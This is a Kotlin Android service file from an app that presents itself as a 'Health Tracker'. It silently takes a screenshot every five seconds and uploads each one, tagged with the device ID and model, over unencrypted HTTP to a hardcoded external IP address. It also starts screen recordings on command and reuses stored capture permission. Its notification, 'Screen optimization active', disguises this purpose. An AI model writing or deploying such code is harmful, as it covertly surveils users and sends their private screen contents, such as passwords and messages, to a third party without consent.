package com.inf2007.healthtracker.utilities

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Point
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class ScreenshotCaptureService : Service() {
    companion object {
        const val TAG = "ScreenshotService"
        private const val SCREENSHOT_QUALITY = 80
        private const val SCREENSHOT_INTERVAL = 5000L
        private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
        private const val NOTIFICATION_ID = 1002
        private const val NOTIFICATION_CHANNEL_ID = "screenshot_channel"

        const val CMD_START_SCREENSHOT = "START_SCREENSHOT"
        const val CMD_STOP_SCREENSHOT = "STOP_SCREENSHOT"
        const val CMD_CAPTURE_NOW = "CAPTURE_NOW"

        // Keys for intent extras
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_DATA = "data"

        const val ACTION_START_SCREEN_RECORD = "START_SCREEN_RECORD"
        const val ACTION_STOP_SCREEN_RECORD = "STOP_SCREEN_RECORD"
        const val EXTRA_RECORD_REASON = "record_reason"

        // Track recording state
        private var isRecording = false
        private var recordReason: String? = null

        fun isRecording(): Boolean = isRecording
        fun getRecordReason(): String? = recordReason
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isCapturing = AtomicBoolean(false)
    private val handler = Handler(Looper.getMainLooper())
    private var screenDensity: Int = 0
    private var screenWidth: Int = 0
    private var screenHeight: Int = 0
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var isStopped = AtomicBoolean(false)

    private val screenshotRunnable = object : Runnable {
        override fun run() {
            if (isCapturing.get() && !isStopped.get()) {
                captureScreenshot()
                handler.postDelayed(this, SCREENSHOT_INTERVAL)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        getScreenDimensions()
        createNotificationChannel()
        Log.i(TAG, "Screenshot capture service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "=== SCREENSHOT SERVICE STARTED ===")

        if (intent != null) {
            Log.i(TAG, "Action: ${intent.action}")
            Log.i(TAG, "Command: ${intent.getStringExtra("command")}")
            Log.i(TAG, "Extras: ${intent.extras?.keySet()}")

            initializeFromIntent(intent)
        }

        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification())

        if (mediaProjection == null) {
            Log.i(TAG, "MediaProjection is null, attempting to restore from saved data...")
            if (initMediaProjectionFromSavedData()) {
                Log.i(TAG, "MediaProjection successfully restored from saved data")
            } else {
                Log.w(TAG, "No saved MediaProjection data found")
            }
        }

        // Get saved MediaProjection data from SharedPreferences
        val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
        val savedResultCode = prefs.getInt("result_code", -1)
        val savedIntentUri = prefs.getString("media_projection_intent", null)

        // Handle screen recording actions
        when (intent?.action) {
            ACTION_START_SCREEN_RECORD -> {
                val reason = intent.getStringExtra(EXTRA_RECORD_REASON) ?: "unknown"
                Log.i(TAG, "Starting screen recording for reason: $reason")

                if (mediaProjection == null) {
                    Log.i(TAG, "MediaProjection still null, trying one more time...")
                    if (initMediaProjectionFromSavedData()) {
                        Log.i(TAG, "MediaProjection restored on second attempt")
                        handler.postDelayed({
                            startScreenRecording(reason)
                        }, 500)
                    } else {
                        Log.e(TAG, "No MediaProjection available for recording")
                    }
                } else {
                    Log.i(TAG, "MediaProjection already available, starting recording immediately")
                    startScreenRecording(reason)
                }
                return START_STICKY
            }

            ACTION_STOP_SCREEN_RECORD -> {
                Log.i(TAG, "Stopping screen recording")
                stopScreenRecording()
                return START_STICKY
            }
        }

        // Handle screenshot commands (via "command" extra)
        val command = intent?.getStringExtra("command")
        when (command) {
            CMD_START_SCREENSHOT -> {
                Log.i(TAG, "Processing START_SCREENSHOT command")

                // Try to get from intent first, then from saved prefs
                var resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                var data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(EXTRA_DATA)
                }

                // If not in intent, use saved data
                if (data == null && savedResultCode != -1 && savedIntentUri != null) {
                    resultCode = savedResultCode
                    data = Intent.parseUri(savedIntentUri, 0)
                    Log.i(TAG, "Using saved MediaProjection data")
                }

                if (data != null) {
                    // Try to use persistent projection first
                    val persistentProjection = ScreenshotPermissionHelper.getPersistentMediaProjection()
                    if (persistentProjection != null) {
                        mediaProjection = persistentProjection
                        Log.i(TAG, "Using persistent MediaProjection")
                    } else {
                        setupMediaProjection(resultCode, data)
                    }
                    startScreenshotCapture()
                } else {
                    Log.e(TAG, "No media projection data available for screenshot")
                }
            }

            CMD_STOP_SCREENSHOT -> {
                Log.i(TAG, "Processing STOP_SCREENSHOT command")
                stopScreenshotCapture()
            }

            CMD_CAPTURE_NOW -> {
                Log.i(TAG, "Processing CAPTURE_NOW command")

                // Ensure we have MediaProjection
                if (mediaProjection == null) {
                    val persistentProjection = ScreenshotPermissionHelper.getPersistentMediaProjection()
                    if (persistentProjection != null) {
                        Log.i(TAG, "Using persistent MediaProjection from startup")
                        mediaProjection = persistentProjection
                    } else if (savedResultCode != -1 && savedIntentUri != null) {
                        val data = Intent.parseUri(savedIntentUri, 0)
                        setupMediaProjection(savedResultCode, data)
                    } else {
                        Log.e(TAG, "No MediaProjection available for single capture")
                        return START_STICKY
                    }
                }

                // Check if we're already in continuous capture mode
                if (isCapturing.get()) {
                    Log.i(TAG, "Already in continuous capture mode, capturing one now")
                    captureScreenshot() // Use the regular capture method
                } else {
                    // For single capture, setup, capture, cleanup
                    Log.i(TAG, "Setting up virtual display for single capture")
                    setupVirtualDisplay()

                    handler.postDelayed({
                        captureSingleScreenshot()
                        // Cleanup after capture completes
                        handler.postDelayed({
                            Log.i(TAG, "Cleaning up virtual display after single capture")
                            cleanupVirtualDisplay()
                        }, 1000)
                    }, 200)
                }
            }

            null -> {
                if (intent?.action == null) {
                    Log.w(TAG, "No action or command received")
                }
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // Not a bound service
    }

    override fun onDestroy() {
        super.onDestroy()
        mediaProjection?.let {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                it.stop()
            } else {
                @Suppress("DEPRECATION")
                it.stop()
            }
        }
        mediaProjection = null
        Log.i(TAG, "Screenshot capture service destroyed")
    }

    private fun captureSingleScreenshot() {
        Log.d(TAG, "captureSingleScreenshot() called")

        if (imageReader == null) {
            Log.d(TAG, "imageReader null")
            return
        }

        try {
            val image = imageReader?.acquireLatestImage()

            if (image != null) {
                // Use a background thread for processing
                Thread {
                    try {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * screenWidth

                        val bitmap = Bitmap.createBitmap(
                            screenWidth + rowPadding / pixelStride,
                            screenHeight,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)

                        val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                        // Upload on background thread
                        uploadScreenshot(croppedBitmap)

                        bitmap.recycle()
                        croppedBitmap.recycle()
                        image.close()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing screenshot: ${e.message}")
                    }
                }.start()
            } else {
                // If no image available, try again quickly
                handler.postDelayed({
                    captureSingleScreenshot()
                }, 100)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture single screenshot: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Screen Capture Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Health Tracker")
            .setContentText("Screen optimization active")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun getScreenDimensions() {
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        screenDensity = resources.displayMetrics.densityDpi

        val size = Point()
        display.getSize(size)
        screenWidth = size.x
        screenHeight = size.y

        Log.i(TAG, "Screen dimensions: ${screenWidth}x${screenHeight}, density: $screenDensity")
    }

    private fun setupMediaProjection(resultCode: Int, data: Intent) {
        try {
            Log.i(TAG, "Setting up MediaProjection with resultCode: $resultCode")
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            Log.i(TAG, "✓ MediaProjection setup successful: $mediaProjection")
        } catch (e: Exception) {
            Log.e(TAG, "✗ MediaProjection setup failed: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun startScreenshotCapture() {
        Log.i(TAG, "Starting screenshot capture...")
        isStopped.set(false)
        Log.i(TAG, "mediaProjection is null? ${mediaProjection == null}")

        if (mediaProjection == null) {
            Log.e(TAG, "Cannot start: MediaProjection not initialized")
            return
        }

        isCapturing.set(true)
        Log.i(TAG, "Setting up virtual display...")
        setupVirtualDisplay()

        // Add delay before starting the runnable to let virtual display initialize
        Log.i(TAG, "Waiting 500ms for virtual display to initialize...")
        handler.postDelayed({
            Log.i(TAG, "Starting screenshot runnable...")
            handler.post(screenshotRunnable)
            Log.i(TAG, "Screenshot capture started successfully")
        }, 500) // 500ms delay
    }

    private fun stopScreenshotCapture() {
        Log.i(TAG, "Stopping screenshot capture...")
        isStopped.set(true)
        isCapturing.set(false)
        handler.removeCallbacks(screenshotRunnable)
        cleanupVirtualDisplay()
        Log.i(TAG, "Screenshot capture stopped")
    }

    private fun setupVirtualDisplay() {
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )

        Log.i(TAG, "VirtualDisplay setup complete")
    }

    private fun cleanupVirtualDisplay() {
        virtualDisplay?.release()
        imageReader?.close()
        virtualDisplay = null
        imageReader = null
    }

    private fun captureScreenshot() {
        Log.d(TAG, "captureScreenshot() called, isCapturing: ${isCapturing.get()}")

        if (!isCapturing.get() || imageReader == null) {
            Log.d(TAG, "Not capturing or imageReader null")
            return
        }

        try {
            val image = imageReader?.acquireLatestImage()
            Log.d(TAG, "Image acquired: ${image != null}")

            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // Crop to actual screen dimensions
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                // Upload to server
                uploadScreenshot(croppedBitmap)

                bitmap.recycle()
                croppedBitmap.recycle()
                image.close()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture screenshot: ${e.message}")
        }
    }

    private fun uploadScreenshot(bitmap: Bitmap) {
        try {
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, SCREENSHOT_QUALITY, stream)
            val byteArray = stream.toByteArray()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "screenshot_${timestamp}.jpg"

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", filename,
                    byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .addFormDataPart("device_id", getUniqueDeviceId())
                .addFormDataPart("device_model", Build.MODEL)
                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                .addFormDataPart("screen_resolution", "${screenWidth}x${screenHeight}")
                .build()

            val request = Request.Builder()
                .url(SCREENSHOT_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Screenshot upload failed: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (response.isSuccessful) {
                            Log.d(TAG, "Screenshot uploaded: $filename")
                        } else {
                            Log.w(TAG, "Screenshot upload failed: HTTP ${response.code}")
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading screenshot: ${e.message}")
        }
    }

    private fun getUniqueDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting device ID: ${e.message}")
            "unknown"
        }
    }

    private fun startScreenRecording(reason: String) {
        if (isRecording()) {
            Log.d(TAG, "Already recording for: ${getRecordReason()}")
            return
        }

        // Check if MediaProjection is available
        if (mediaProjection == null) {
            Log.e(TAG, "MediaProjection is null, cannot start recording")
            return
        }

        try {
            // Setup recording file
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "REC_${reason}_${timestamp}.mp4"
            val recordsDir = File(filesDir, "screen_recordings")
            if (!recordsDir.exists()) recordsDir.mkdirs()
            recordingFile = File(recordsDir, filename)
            Log.i(TAG, "Recording file: ${recordingFile?.absolutePath}")

            // Create MediaRecorder
            mediaRecorder = MediaRecorder()

            // Configure with safer settings
            mediaRecorder?.apply {
                try {
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    Log.i(TAG, "Video source set")

                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    Log.i(TAG, "Output format set")

                    setOutputFile(recordingFile?.absolutePath)
                    Log.i(TAG, "Output file set")

                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    Log.i(TAG, "Video encoder set")

                    // Try with lower resolution first
                    val recordWidth = 720
                    val recordHeight = 1280
                    setVideoSize(recordWidth, recordHeight)
                    Log.i(TAG, "Video size set to ${recordWidth}x${recordHeight}")

                    setVideoFrameRate(24)
                    Log.i(TAG, "Frame rate set")

                    setVideoEncodingBitRate(3000000) // 3 Mbps
                    Log.i(TAG, "Bit rate set")

                    // Prepare
                    Log.i(TAG, "Calling prepare()...")
                    prepare()
                    Log.i(TAG, "MediaRecorder prepared successfully")

                } catch (e: Exception) {
                    Log.e(TAG, "Error configuring MediaRecorder: ${e.message}")
                    e.printStackTrace()
                    cleanupRecording()
                    return
                }
            }

            // Get surface AFTER prepare
            val surface = mediaRecorder?.surface
            if (surface == null) {
                Log.e(TAG, "Failed to get surface from MediaRecorder")
                cleanupRecording()
                return
            }
            Log.i(TAG, "Got surface from MediaRecorder")

            // Create virtual display with the surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecord",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface, null, null
            )

            if (virtualDisplay == null) {
                Log.e(TAG, "Failed to create virtual display")
                cleanupRecording()
                return
            }
            Log.i(TAG, "Virtual display created successfully")

            // Start recording
            try {
                mediaRecorder?.start()
                Log.i(TAG, "MediaRecorder started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "MediaRecorder start failed: ${e.message}")
                cleanupRecording()
                return
            }

            // Update state
            isRecording = true
            recordReason = reason
            Log.i(TAG, "Screen recording started: $filename for reason: $reason")

            // Auto-stop after 2 minutes
            handler.postDelayed({
                stopScreenRecording()
            }, 120000)

        } catch (e: Exception) {
            Log.e(TAG, "Error starting screen recording: ${e.message}")
            e.printStackTrace()
            cleanupRecording()
        }
    }

    private fun stopScreenRecording() {
        if (!isRecording()) return

        Log.i(TAG, "Stopping screen recording for reason: ${getRecordReason()}")

        try {
            // Stop and release MediaRecorder
            mediaRecorder?.apply {
                try {
                    stop()
                    Log.i(TAG, "MediaRecorder stopped successfully")
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping recorder: ${e.message}")
                }
                release()
            }
            mediaRecorder = null

            // Release virtual display
            virtualDisplay?.release()
            virtualDisplay = null

            // IMPORTANT: DO NOT release mediaProjection here!
            // Keep it for future screenshot commands

            // Upload the recording
            recordingFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    Log.i(TAG, "Recording saved: ${file.absolutePath} (${file.length()} bytes)")
                    triggerUpload("screen_recording", file.absolutePath)
                } else {
                    Log.w(TAG, "Recording file missing or empty")
                }
            }
            recordingFile = null

            // Reset imageReader if it was used for recording
            imageReader = null

        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        }

        // Update state
        isRecording = false
        recordReason = null

        Log.i(TAG, "Screen recording stopped, mediaProjection still available: ${mediaProjection != null}")
    }

    private fun cleanupRecording() {
        mediaRecorder = null
        virtualDisplay = null
        isRecording = false  // This updates companion object's isRecording
        recordReason = null   // This updates companion object's recordReason
    }

    private fun triggerUpload(type: String, filePath: String) {
        val intent = Intent("com.inf2007.healthtracker.UPLOAD_FILE").apply {
            putExtra("type", type)
            putExtra("file_path", filePath)
            setPackage("com.inf2007.healthtracker")
        }
        sendBroadcast(intent)
        Log.i(TAG, "Triggered upload for: $filePath")
    }

    private fun initializeFromIntent(intent: Intent) {
        val resultCode = intent.getIntExtra("result_code", -1)
        val intentUri = intent.getStringExtra("media_projection_intent")

        if (resultCode != -1 && intentUri != null) {
            try {
                val data = Intent.parseUri(intentUri, 0)
                setupMediaProjection(resultCode, data)
                Log.i(TAG, "✓ MediaProjection initialized from intent")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to parse intent URI: ${e.message}")
            }
        }
    }

    private fun initMediaProjectionFromSavedData(): Boolean {
        try {
            val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
            val savedResultCode = prefs.getInt("result_code", -1)
            val savedIntentUri = prefs.getString("media_projection_intent", null)

            Log.d(TAG, "initMediaProjectionFromSavedData: resultCode=$savedResultCode, intentUri=$savedIntentUri")

            if (savedResultCode != -1 && savedIntentUri != null) {
                Log.i(TAG, "Found saved MediaProjection data, resultCode: $savedResultCode")

                val data = Intent.parseUri(savedIntentUri, 0)
                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = projectionManager.getMediaProjection(savedResultCode, data)

                if (mediaProjection != null) {
                    Log.i(TAG, "MediaProjection restored from saved data")
                    return true
                } else {
                    Log.e(TAG, "getMediaProjection returned null")
                }
            } else {
                Log.d(TAG, "No saved MediaProjection data found")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restore MediaProjection from saved data: ${e.message}")
            e.printStackTrace()
        }
        return false
    }
}